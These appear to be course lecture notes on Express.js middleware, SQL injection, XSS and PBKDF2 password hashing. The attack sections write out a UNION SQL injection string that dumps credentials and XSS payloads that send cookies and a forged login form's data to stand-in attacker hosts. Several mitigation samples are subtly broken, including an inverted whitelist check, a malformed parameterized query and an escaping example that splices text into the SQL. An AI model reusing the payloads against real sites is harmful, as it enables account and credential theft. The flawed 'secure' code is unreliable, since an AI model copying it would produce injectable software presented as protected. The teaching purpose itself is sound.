# Appropriate Use cases To Run `next()` 

### Terminology  

* `middleware`:

  * A function that comes before `route handlers` or even other `middleware` functions.
  
  * It has access to the `request` and `response`, as well as the `next` callback in the `request - response` cycle.
  
  * Use `middleware` functions to:
  
    * Execute code:
    
      * body parsing.
      
      * cookie parsing.
      
      * json request.
      
      * etc.
      
    * Change the `request` and/or the `response` objects.
    
    * End the `request - response` cycle.
    
    * **Call the** `next` `middleware` **function**.
    
* `next`:

    * When authoring `middleware`, use `next` to indicate that the `middleware` function has finished.
    
    * `next` functions as a callback.
    
    * Calling next continues the processing of the `request`.
    
    * Failing to call `next` will cause the process to hang.
    
    * This is because `Express` has no way of knowing that the operation is done and that it needs to move down the pipeline to the * next `middleware` or route.
    
#### Using Next  

* Asynchronous setting:

  * Example: looking up data that results in a `callback`.
  
  * Call `next` inside the callback.
  
* Invoking a route:

  * invoking `next('route')` will skip to the next route handler.
  
  * Subsequent functions will not be executed.
  
* Passing errors:

  * Pass errors to `next` to handle them separately.

> If the current middleware function does not end the request-response cycle, it must call next() to pass control to the next middleware function. Otherwise, the request will be left hanging. - Expressjs.com

### Calling Next()  

#### Example  

```javascript
var express = require('express');
var bodyParser = require('body-parser');
var app = express();

app.set('views', './views');
app.set('view engine', 'mustache');

app.use(express.static('public'));
app.use(bodyParser.urlencode({ extend: true }));

app.use(function(req, res, next){
  /* Middleware logic.
  Example:
  Load a session / user
  Then, call next()
  */
  next(); // Once the session is loaded, then the process moves on
  // to the next step in the pipeline. In this case, a route.
});

app.get('/', function(req, res, next){
  // req.session.user is available, since the middleware ran first and process a request for the session.
  // We can now use the req.session.user object in the view template.
  res.render('index', {title: 'home'});
});
```

### Invoking The Next Route  

#### Example  

* Use `next('route')` when using multiple callback function in the route handler.

```javascript
app.get('/foo',
function checkRegistration (req, res, next){
  if(!req.user.registered){
    // If user has not registered, skip to the next route.
    // getRegistration will not be executed.
    next('route')
  }
}, function getRegistration (req, res, next) {
  Registration.find(function (err, data){
    if (err) return next(err)
    res.json(data)
  });
});
```

> Passing anything into `next` other than the string 'route', will cause `Express` to process the request as being in *error*. Subsequent `middleware` functions and non-error handling routing will be skipped.


### Passing Errors  

# Example  

* Passing an error into `next()` instructs `Express` to process the `error` middleware.

* Using `next()` to pass an error(s) helps consolidate error processing into a single point in the application, instead of defining an error from within each route.

```javascript
var express = require('express');
var bodyParser = require('body-parser');
var Sequelize = require('sequelize');
var sequelize = {};
var app = express();

app.set('views', './views');
app.set('view engine', 'mustache');

app.use(express.static('public'));
app.use(bodyParser.urlencode({ extend: true }));


// In this example '/post' does not exist.
// This request will cause an error, which will be handled by the * error path.
app.get('/post', function(req, res, next) {
  Post.findById(1234).then(function(post, err){
    if (err) {
      return next(err);
    }
    if(!post) {
      var notFound = new Error('Post not found!');
      notFound.status = 404;
      return next(notFound);  
    }
    res.send(post);    
  });
});

app.get('*', function(req, res, next) { // We handle any GET request path by assigning a path of *
  var err = new Error();
  err.status = 404;
  next(err); // Pass the error to the error middleware.
});

// Error middleware:
// Error middleware order matters. Keep them together and consecutive, below the routes.
// Error middleware is different from a regular middleware.
// It needs four arguments: err, req, res and next.
app.use(function(err, req, res, next) {
  if(err.status !== 404) {
    return next();
  }
  res.send(err.message);
});

// IF the error is not a 404, you can specify another status.
app.use(function(err, req, res, next) {
  // during development we may want to print the errors:
  console.log(err.stack);
  // Log error for debugging.
  log.error(err, req);
  res.status(500);
  res.send('Oops, we broke the internet!');
});

app.listen(3000);
```

#### Default Error Handler  

> Express comes with a built-in error handler, which takes care of any errors that might be encountered in the app. This default error-handling middleware function is added at the end of the middleware function stack.

> If you pass an error to next() and you do not handle it in an error handler, it will be handled by the built-in error handler; the error will be written to the client with the stack trace. The stack trace is not included in the production environment. - expressjs.com

* Custom error handler:

  * When the headers have already been sent, delegate the default error handling mechanism in Express.
  
```javascript
function errorHandler (err, req, res, next) {
  if (res.headersSent) {
    return next(err)
  }
  res.status(500)
  res.render('error', { error: err })
}
```

---

# Lecture Notes  

### Terminology  

* `Injection`: text-based attack that exploits an interpreter's syntax.

  * Implications: data corruption, data loss, data theft, denial of access.

### SQL Injection  

#### Database  

* In this example the X-Men have an 'accounts' database with three fields: username, role, and password.

* To make the problems worse, the passwords are stored as plain text!

id	username	role	password
1	wolverine	owner	claws!
2	profx	admin	mindgames
3	cyclops	owner	lookskill
4	storm	owner	umbrella
5	beast	admin	bluevelvet

#### Vulnerable Code  

* Even though legitimate, the code is vulnerable to injections since anything can be passed into the query.

```javascript
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role = '"​ + req.params.role + ​"' ", // <---Vulnerability!!!!
      { type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
```

#### Legitimate Query  

* Searching for all fields, `*`, who are admins.

  * **Input query**: `admin`

  * **Resulting query**:
 
``` 
SELECT * FROM accounts WHERE role = ('admin')
```

* This query would return:

```
profx
beast
```

#### Malicious Query  

* Here Magneto uses a single-quote `'` to break out of the string context and into the query.

* Then, he passes in the following malicious query:

  * **Input query**: `') UNION SELECT username||'_'||password FROM accounts --`
  
  * This would append the username and passwords for all X-Men in the database who are admins!
  
    * double pipes, `||`, are used for concatenating.
    
    * The `--` comments out the remaining text. This "consumes" the final code provided by the application.
    
 * **Resulting query**:

> SELECT * FROM accounts WHERE role = (`'%') UNION SELECT username || '_' ||password FROM accounts --`

* This query would return the following:

```
profx_mindgames
beast_bluevelvet
```

### Input Validation  

* Input sanitation is one way of preventing injections by limiting input in order to avoid problem characters.

* One method of sanitation is whitelisting.

#### Whitelisting  

* Defining *allowed* inputs values (letters, digits, spaces) and conditions.

##### Example

```
// Limiting input to letters.
/[a-zA-Z]/

// Limiting input to digits.
/[0-9]/

// Limiting input to letters and digits.
/[a-zA-Z0-9]/

// Limiting input to letters, digits and Spaces
/[a-zA-Z0-9 ]/
```

##### Implementation

* Validate that the role contains only letters.

```javascript
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  // Validate letters and digits, only!
  // ^ marks the beginning of the string.
  if(!req.params.role.match(/[^a-zA-Z]/)){
    var valError = new Error ("Input must be letters, only.");
    valError.status = 500;
    next(valError);
  }
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role = '" + req.params.role + ​"' ",
      { type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// varError middleware.
```

### Escaping  

* Escaping is a widely used method.

* It is a ready-to-go function, provided by many libraries, for escaping well-know problem characters.

#### Implementation  

```javascript
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  // db is the database.
  var dbEscape = db.escape(req.params.role);
  var type = "{ type: sequelize.QueryTypes.SELECT}";
  var query = "SELECT * FROM accounts WHERE role = '" + dbEscape + "' " + type;
  try {
    sequelize.query(query)
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// Error handlers
```

### Prepared Statements  

* The `SQL` query code is predefined by the developer so that parameters are passed into the query later.

* The variable data is replaced by a placeholder, such as a `?`, which is then processed by the database as a parameter.

* `Prepared statements (parameterized statements)` are parsed, compiled, and optimized by the database **separately** from any parameters before they are executed.

* Why is it effective against injections?

  * The input values in an `SQL` query are sent to the server after the query is sent to the server.
  
  * Incoming input is interpreted as data, instead of `SQL` code.
  
* Check ORM and database documentation for details.

Implementation  

* `Sequelize example`.

```javascript
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  try {
    sequelize.query(
      "SELECT * FROM accounts WHERE role ?",
      { replacement: ["'​ + req.params.role + ​'"]
      type: sequelize.QueryTypes.SELECT}
    )
    .spread(function(results, metadata){
      // Add results to the response.
    });
  } catch {
    // Handle errors
  }
});
// Other Routes
// Error handlers
```

### ORM Built-in Query Methods  

* ORM built in methods automatically take care of escaping.

* Check ORM documentation for details.

#### Example

* `Sequelize` example.

```javascript
var sequelize = require('sequelize');
var app = express();

// app.use middleware here.

// Routes
app.get('/mutants/:role', function(req, res, next){
  var role = req.params.role;
  Accounts.findAll({
      role: role
  })
  .then(function (admin){
    console.log(admin);
  });
});
// Other Routes
// Error handlers
```

### Programming Culture  

[Bobby Tables](http://www.bobby-tables.com/)

---

# The Impact Of XSS On User Privacy  

### Terminology  

* `XSS` (Cross-site scripting):

  * Allows an attacker to inject malicious code into a website through various methods.
  
  * The `request` / `response` cycle is used as a mechanism to execute the code from the victim's browser.
  
  * Vulnerable websites are exploited, not the victim's machine.
  
### How?  

* An attacker uses a vulnerable `input` to *inject* a `string` containing malicious code, which subsequently runs in the victim's browser as legitimate code.

* The JavaScript Code:

  * Can be used to modify the `HTML` by using `DOM` manipulation methods.
  
  * Can access sensitive information, such as `cookies`.
  
  * Use `XMLHttpRequest` to send arbitrary content to arbitrary destinations.

### Types of attack:  

* **Reflected XSS**: it does **not** originate from the targeted server, but from the victim's `request`.

  * This attacked can be delivered via another website or an email.
  
  * The injected code is reflected off the server in a search result, error message, or another `response` which includes all or part of the `input` sent to the server as a `request`.
  
    1. A URL containing the malicious code is sent to the victim.
  
    2. The victim then `requests` the URL from the website.
  
    3. The website includes the malicious string from the URL in the `response`.
  
    4. The victim's browser executes the code sending the victims data back to the attacker's server.

* **Persistent (stored) XSS**: the malicious code is stored in a target's server, where it is later retrieved by the victim via a `request` for data containing the malicious code.

  1. The attacker inject the malicious code into the server via a vulnerable form, which is stored in the database.
  
  2. The victims makes a `request` to the website.
  
  3. The `response`, containing the malicious code, is sent to the victim.
  
  4. The victim's browser executes the code sending the victims data back to the attacker's server.

* **DOM-based XSS**: a combination of both `persistent` and `reflected` `XSS`:

1. A URL containing the malicious code is sent to the victim.
  
  2. The victim then `requests` the URL from the website.
  
  3. The targeted website receives the `request`, but it does not include the malicious code in the `response`.
  
  4. The victim's browser executes the *legitimate* code inside the `response`, inserting the malicious code into the website.
  
  5. The victim's browser executes the *inserted* malicious code and sends the `response` back to the attacker's server containing the victims data.
  
  6. What makes it different?
  
  7. No malicious code is inserted into the website.
  
  8. The website's own code uses the user's input in order to add `HTML` into the page using `innerHTML`.
  
  9. The code is `parsed` as `HTML`, which in turn executes the code after the page has loaded.

* **Key-logging**: malicious code is using `addEventListener` is used to send a victim's keystrokes back to the attacker's server.

### Impact On User Privacy  

#### Stealing sensitive data  

* Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions

##### Example

* In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
  </script>
```

#### Stealing credentials  

* `JavaScript` and `HTML` are used to steal credentials instead of `cookies`. A targeted website's login page is cloned and it is served to a victim.

##### Example

* In this example a cloned login page is used to steal a victims credentials.

* The attacker then can wreak havoc in the victim's social media, bank accounts, etc.

```html
<div>
  <h3>Security Alert</h3>
  <h4>Your session has expired.</h4>
  <form action=http://[Attacker IP]>
    Username:<br><input type="text" name="user"><br>
    Password:<br><input type="password" name="pass"><br><br>
    <input type="submit" value="Logon">
  </form>
</div>
```

#### Account Hijacking  

* A victim's `session` `cookies` are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.

##### Example

* In this example an attacker targets a forms vulnerable field to inject a malicious image.

```html
<script>
new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.cookie);
</script>
```

### Mitigating XSS  

* All user input should be escaped or sanitized.

#### express-validator  

* The `express-validator` module simplifies input sanitation.

#### Usage

* Install `express-validator`: `npm install express-validator --save`

* Import: `var validator = require('express-validator')`

* Apply after `body-parser`

```javascript
//req.body.password = 'a <span>comment</span>';
//req.body.username = " I'm-gonna-hack-you' ";

app.post('/login', function(request, response){
  req.assert('password', 'Password is required').notEmpty();
  req.assert('username', 'Your must enter a user name').notEmpty();

  // Sanitize password and username
  req.sanitize('password').escape(); // Returns: a &lt;span&gt;comment&lt;&#x2F;span&gt;
  req.sanitize('username').escape(); // Returns: I&#x27;m-gonna-hack-you&#x27;

  var errors = request.validationErrors();
  if (errors)
    res.render('error', {errors: errors});
  else
    res.render('login', {password: req.password, username: req.username});
});
```
---

# Protecting User Password  

### Terminology  

* `PBKDF2`: a “password-strengthening algorithm” (`HMAC`) use to safeguard a password during a brute force attack by making it difficult, using `iterations`, to check whether or not that password is the master password.

  * `Iterations`: the number of times the encryption algorithm is applied.
  
    * increases the strength of a password by increasing the time it takes to test each key in a brute force attack.
    
    * `key`: the combination of the `password`, `salt`, and `iterations count`.
    
* `SHA-256`: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.

  * Encoding:
  
    * `hex`: 64 characters.
    
    * `base64`: 44 characters.
    
* `SHA-512`: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.

  * Encoding:
  
    * `hex`: 128 characters.
    
    * `base64`: 88 characters.
    
* `HMAC`: hash based authentication code.

* `Hashing`: the process of creating a fixed-length cryptic string from a variable-length string (password).

* `Salt`: a unique and random string of characters used as an extra input in a `hashing` function in order to safeguard a stored password.

  * `salt` is added to the password before `hashing`. This helps randomize the password and increases it's complexity in order to safeguard against rainbow and lookup table attacks.
  
  * A 12 bit `salt` would require 4096 rainbow tables in order to find a common password.
  
* `Digest`: In a cryptographic hash function, the `digest` is the function's fixed-size alphanumeric output. (also known as `message digest`, `checksum` and `digital fingerprint`)

* `Crypto` (module):

> The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org](https://nodejs.org/api/crypto.html#crypto_crypto)

### Why Salt and Hash?  

* Avoid duplicate hashes.

  * Hashes of the same password are identical.
  
    * Makes it possible to decipher using a rainbow or lookup table.
  
    * Two users could share the same password, therefore the same hash. A hacker can use this to predict passwords.
    
  * Therefore, adding salt to a password and then hashing it reduces the chance of having duplicated hashes.

> Never, EVER, store a password as plain text. EVER.

### PBKDF2 Implementation  

1. Create password hash:

  * Input: user password.
  
  * Generate Salt.
  
  * Generate hash:
  
  * Store resulting password hash, salt, and iterations (for validation).
  
2. Validate attempted password:

* Input: attempted password.

* Retrieve password hash, salt, and iterations.

* Generate hash:

  * Hash attempted password / stored salt / stored iterations:
  
* Assert resulting hash against stored hash.

### Recommendation  

* Use Password-Based Key Derivation Function 2 (PBKDF2).1

* Salt should be as unique as possible. Consider creating a random key with a length greater than 16 bytes.

  * Iterations should be a number set as high as possible. The higher, the more secure the key will be.
  
    * The higher the iteration, the longer it will take to complete the process.
    
* keylen: byte length of the digest, derived from the password, salt and iterations.

* digest: use either sha256 or shat512 to encrypt the output.

> AGAIN: never, EVER, store a password as plain text. EVER.

### Example  

* In this example we use Express's Crypto module.

* Synchronous implementation: crypto.pbkdf2Sync(password, salt, iterations, keylen, digest)

  * If an error happens, an Error is thrown. If not, the key is returned as a Buffer.
  
  * Learn more
  
* Your implementation may differ.

> See Node.js docs for asynchronous implementation.

### Creating a hashed password - Implementation suggestion  

* Crypto randomBytes

* Math.ceil(): returns the smallest integer greater than or equal to a given number. 2

* toString('base64'): convert string to base64.

* toString('hex'): convert string to a hexadecimal.

* randomByes(): generates a random string.

```javascript
'use strict';

// Require Crypto module
var crypto = require('crypto');

// Set configuration parameters.

var config = {
    salt: function(length){
    // 'Math.ceil(length * 3 / 4)' generates a base64 value.
    return crypto.randomBytes(Math.ceil(32 * 3 / 4)).toString('base64').slice(0, length);
    // If returning a value in hex format, do the following:
    //return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length);
    },
    iterations: 20000, // Specify iteration count.
    keylen: 512, //  Specify algorithm byte length.
    digest: 'sha512' // Specify algorithm.
};


// Generate hash
function hashPassword(passwordinput){
    // Add salt:
    var salt = config.salt(32); // Pass in salt length.
    // Add iterations:
    var iterations = config.iterations;
    // Hash password:
    var hash = crypto.pbkdf2Sync(passwordinput, salt, iterations, config.keylen, config.digest); // Pass in password, salt, iterations, keylength, and algorithm (sha256 or sha512),.
    // Encode hash:
    var hashedPassword = hash.toString('base64');
    // If using hex, do the following:
    // var hashedPassword = hash.toString('hex');

    // Dev log:
    console.log('Hashed password: ', hashedPassword);
    console.log('Salt: ', salt );

    // TODO: save salt, hash, and iterations to database for later retrieval.
    return {salt: salt, hash: hashedPassword, iterations: iterations};
}

// For Demonstration purposes:
// Call hashPassword passing in password input.

hashPassword('password123!');
```

### Password verification  

* Compare saved hash to attempted password hash.

* Your implementation may differ.

```javascript
var config = {
    keylen: 512,
    digest: 'sha512'
};

function isPasswordCorrect(passwordAttempt) {
    var savedHash = `saved-hash-in-db`; // Retrieve saved hash.
    var savedSalt = `saved-salt-in-db`; // Retrieve saved salt.
    var savedIterations = `saved-interations-in-db`; // Retrieve saved iterations.

    var hash = crypto.pbkdf2Sync(passwordAttempt, savedSalt, savedIterations, config.keylen, config.digest);

    var hashedPassword = hash.toString('base64');
    // Compared saved hash to attempted password hash.
    // Returns a boolean.
    return savedHash === hashedPassword;
}

//For demonstration purposes:

isPasswordCorrect('myPassword'); // Would return false.
```

##### Lesson Footnotes

* 1: PBKDF2 - Wikipedia

* 2: MDN - Math.ceil()
